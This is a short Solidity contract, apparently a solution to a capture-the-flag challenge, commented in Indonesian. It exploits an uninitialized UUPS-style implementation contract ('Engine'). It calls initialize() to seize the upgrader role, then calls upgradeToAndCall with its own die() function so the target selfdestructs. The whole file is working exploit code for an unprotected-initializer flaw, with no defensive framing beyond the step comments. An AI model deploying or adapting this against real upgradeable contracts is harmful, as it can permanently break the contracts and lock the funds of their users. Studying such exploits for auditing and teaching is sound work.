// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EngineKiller {
    
    // Fungsi ini yang akan dipinjam oleh Engine untuk bunuh diri
    function die() external {
        selfdestruct(payable(msg.sender));
    }

    // Fungsi utama serangan
    function kill(address _targetEngine) external {
        // Tahap 1: Infiltrasi
        // Kita panggil initialize() langsung ke Engine.
        // Karena Engine belum pernah di-initialize di konteksnya sendiri, 
        // kontrak INI (EngineKiller) akan menjadi 'upgrader' (admin).
        (bool success1, ) = _targetEngine.call(abi.encodeWithSignature("initialize()"));
        require(success1, "Gagal Infiltrasi: Engine mungkin sudah di-initialize");

        // Tahap 2: Ledakkan
        // Kita panggil upgradeToAndCall.
        // Kita suruh Engine meng-upgrade dirinya ke alamat kontrak INI (address(this)).
        // Lalu kita suruh dia menjalankan fungsi die().
        bytes memory data = abi.encodeWithSignature("die()");
        (bool success2, ) = _targetEngine.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(this), data));
        require(success2, "Gagal Meledakkan: Cek gas atau status admin");
    }
}